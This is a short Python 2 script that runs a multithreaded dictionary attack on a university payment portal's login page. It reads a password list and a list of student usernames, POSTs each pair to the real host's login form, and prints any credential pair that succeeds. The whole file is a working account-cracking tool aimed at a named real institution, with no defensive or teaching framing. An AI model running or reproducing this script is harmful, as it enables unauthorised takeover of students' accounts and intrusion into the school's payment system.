 # -*- coding: latin-1 -*-
import urllib2
import urllib
import httplib
import cookielib
import threading
import sys
def openfile(path):
	fp=open(path)
	files = []
	for password in fp.readlines():
		files.append(password.replace('\n',''))
	fp.close()
	return files
def sendinfo(username,password):
	
	try:
		data =  urllib.urlencode({"Action":"post","userID":username,"userPass":password})
		headers = {"Content-type": "application/x-www-form-urlencoded"
			, "Accept": "text/plain"}
		httpClient = httplib.HTTPConnection("pay.aaa.nsu.edu.cn", 80, timeout=30)
		httpClient.request("POST", "/Telecom/login.aspx?noCacheIE=1440903126617", data, headers)
		response = httpClient.getresponse()
		if len(response.read()) == 2:
			print "<mi> "+username+":"+password+"<ma>"
	except Exception,e:
		print e
	finally:
		if httpClient:
			httpClient.close()
def check(username,passwords):
	for password in passwords:
		sys.stdout.write("Username: %s   PassWord: %s \r" % (username,password))
		sys.stdout.flush()
		sendinfo(username,password)

if __name__ == '__main__':
	passwords=openfile("pass.dic")#字典
	username = openfile("stunum.txt")#学生用户名
	threads = []
	for user in username:
		threads.append(threading.Thread(target=check,args=(user,passwords)))
	for t in threads:
		# t.setDaemon(True)
		t.start()
	t.join()
	print "all is over"


	

